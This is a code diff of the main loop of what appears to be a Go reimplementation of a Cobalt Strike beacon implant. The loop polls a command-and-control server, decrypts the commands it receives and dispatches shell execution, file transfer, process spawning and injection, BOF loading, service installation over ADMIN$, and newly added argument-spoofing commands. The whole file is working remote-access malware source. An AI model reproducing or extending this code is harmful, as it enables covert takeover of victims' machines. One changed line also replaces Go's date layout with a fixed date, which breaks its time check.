@@ -5,6 +5,7 @@ import (
 	"encoding/hex"
 	"errors"
 	"fmt"
+	"main/communication"
 	"main/config"
 	"main/crypt"
 	"main/packet"
@@ -16,64 +17,70 @@ import (
 func main() {
 	if config.ExecuteKey != "" {
 		if len(os.Args) != 2 {
-			os.Exit(0)
+			return
 		}
 		if os.Args[1] != config.ExecuteKey {
-			os.Exit(0)
+			return
 		}
 	}
 
 	if config.ExecuteTime != "" {
-		t, _ := time.Parse("2006-01-02 15:04:05", config.ExecuteTime)
+		t, _ := time.Parse("2021-01-01 12:00:05", config.ExecuteTime)
 		if time.Now().UTC().Unix() > t.Unix() {
-			os.Exit(0)
+			return
 		}
 	}
 
 	if config.HideConsole {
-		errConsole := packet.HideConsole()
-		if errConsole != nil {
+		errConsole := services.HideConsole()
+		if errConsole != nil && errConsole.Error() != "The operation completed successfully." {
 			fmt.Println(errConsole)
 		}
 	}
 
 	errDPI := services.ProcessDPIAware()
-	if errDPI != nil {
+	if errDPI != nil && errDPI.Error() != "The operation completed successfully." {
 		fmt.Println(errDPI)
 	}
 
-	errFirstBlood := packet.FirstBlood()
+	errFirstBlood := communication.FirstBlood()
 	if errFirstBlood != nil {
 		fmt.Println(errFirstBlood)
 		time.Sleep(3 * time.Second)
-		os.Exit(0)
+		return
+	}
+
+	errInit := services.Init()
+	if errInit != nil {
+		communication.ErrorProcess(errInit)
 	}
 
 	var Token uintptr
 	var powershellImport []byte
+	var argues = make(map[string]string)
 	for {
-		data, err := packet.PullCommand()
+		data, err := communication.PullCommand()
 		if data != nil && err == nil {
 			totalLen := len(data)
 			if totalLen > 0 {
 				_ = data[totalLen-crypt.HmacHashLen:]
 				restBytes := data[:totalLen-crypt.HmacHashLen]
-				decrypted, errPacket := packet.DecryptPacket(restBytes)
+				decrypted, errPacket := communication.DecryptPacket(restBytes)
 				if errPacket != nil {
-					packet.ErrorProcess(errPacket)
+					communication.ErrorProcess(errPacket)
 					continue
 				}
 				_ = decrypted[:4]
 				lenBytes := decrypted[4:8]
-				packetLen := packet.ReadInt(lenBytes)
+				packetLen := communication.ReadInt(lenBytes)
 				decryptedBuf := bytes.NewBuffer(decrypted[8:])
 				for {
 					if packetLen <= 0 {
 						break
 					}
-					cmdType, cmdBuf, errParse := packet.ParsePacket(decryptedBuf, &packetLen)
+					cmdType, cmdBuf, errParse := communication.ParsePacket(decryptedBuf, &packetLen)
 					if errParse != nil {
-						packet.ErrorProcess(errParse)
+						communication.ErrorProcess(errParse)
 						continue
 					}
 					if cmdBuf != nil {
@@ -85,19 +92,19 @@ func main() {
 						var result []byte
 						switch cmdType {
 						case packet.CMD_TYPE_SHELL:
-							result, err = services.CmdShell(cmdBuf, Token)
+							result, err = services.CmdShell(cmdBuf, Token, argues)
 							callbackType = 0
 						case packet.CMD_TYPE_UPLOAD_START:
-							filePath, fileData := packet.ParseCommandUpload(cmdBuf)
+							filePath, fileData := services.ParseCommandUpload(cmdBuf)
 							match := len(filePath) == 30 && bytes.HasPrefix(filePath, []byte("\\\\127.0.0.1\\ADMIN$\\")) && bytes.HasSuffix(filePath, []byte(".exe"))
 							if match && bytes.Contains(fileData, []byte("RegisterServiceCtrlHandlerA")) && len(fileData) > 250000 && len(fileData) < 350000 {
-								result, err = services.CmdService(Token)
+								result, err = services.CmdService(Token, argues)
 							} else {
-								result, err = services.CmdUploadStart(cmdBuf)
+								result, err = services.CmdUpload(cmdBuf, true)
 							}
 							callbackType = 0
 						case packet.CMD_TYPE_UPLOAD_LOOP:
-							result, err = services.CmdUploadLoop(cmdBuf)
+							result, err = services.CmdUpload(cmdBuf, false)
 							callbackType = 0
 						case packet.CMD_TYPE_DOWNLOAD:
 							result, err = services.CmdDownload(cmdBuf)
@@ -119,12 +126,15 @@ func main() {
 							callbackType = 19
 						case packet.CMD_TYPE_EXIT:
 							result, err = services.CmdExit()
+							if err == nil {
+								return
+							}
 							callbackType = 0
 						case packet.CMD_TYPE_SPAWN_X64:
 							bx64, _ := hex.DecodeString("626561636f6e2e7836342e646c6c") //beacon.x64.dll
 							if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx64) {
 								filename, _ := os.Executable()
-								result, err = services.CmdExecute([]byte(filename), Token)
+								result, err = services.CmdExecute([]byte(filename), Token, argues)
 							} else {
 								result, err = services.CmdSpawnX64(cmdBuf)
 							}
@@ -133,13 +143,13 @@ func main() {
 							bx86, _ := hex.DecodeString("626561636f6e2e646c6c") //beacon.dll
 							if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx86) {
 								filename, _ := os.Executable()
-								result, err = services.CmdExecute([]byte(filename), Token)
+								result, err = services.CmdExecute([]byte(filename), Token, argues)
 							} else {
 								result, err = services.CmdSpawnX86(cmdBuf)
 							}
 							callbackType = 0
 						case packet.CMD_TYPE_EXECUTE:
-							result, err = services.CmdExecute(cmdBuf, Token)
+							result, err = services.CmdExecute(cmdBuf, Token, argues)
 							callbackType = 0
 						case packet.CMD_TYPE_GETUID:
 							result, err = services.CmdGetUid()
@@ -152,7 +162,7 @@ func main() {
 							callbackType = 0
 						case packet.CMD_TYPE_PS:
 							result, err = services.CmdPs(cmdBuf)
-							resultType := packet.ReadInt(cmdBuf)
+							resultType := communication.ReadInt(cmdBuf)
 							//fmt.Println(resultType)
 							if resultType == 0 {
 								callbackType = 17
@@ -220,25 +230,34 @@ func main() {
 							result, err = services.CmdInjectX86(cmdBuf)
 							callbackType = 0
 						case packet.CMD_TYPE_BOF:
-							result, err = services.CMDBof(cmdBuf)
+							result, err = services.CmdBof(cmdBuf)
 							callbackType = 0
 						case packet.CMD_TYPE_RUNU:
 							result, err = services.CmdRunu(cmdBuf)
+							callbackType = 0
+						case packet.CMD_TYPE_ARGUE_QUERY:
+							result, err = services.CmdArgueQuery(argues)
+							callbackType = 0
+						case packet.CMD_TYPE_ARGUE_REMOVE:
+							result, err = services.CmdArgueRemove(argues, cmdBuf)
+							callbackType = 0
+						case packet.CMD_TYPE_ARGUE_ADD:
+							result, err = services.CmdArgueAdd(argues, cmdBuf)
 							callbackType = 0
 						default:
 							err = errors.New("This type is not supported now.")
 						}
 						// convert charset here
 						if err != nil {
-							packet.ErrorProcess(err)
+							communication.ErrorProcess(err)
 						} else {
-							packet.DataProcess(callbackType, result)
+							communication.DataProcess(callbackType, result)
 						}
 					}
 				}
 			}
 		} else if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 		}
 		/*if config.Sleep_mask {
 			packet.DoSuspendThreads()
@@ -255,7 +274,7 @@ func main() {
 		waitTime, err := services.CallbackTime()
 		if err != nil {
 			fmt.Println(err)
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 		}
 		time.Sleep(waitTime)
 
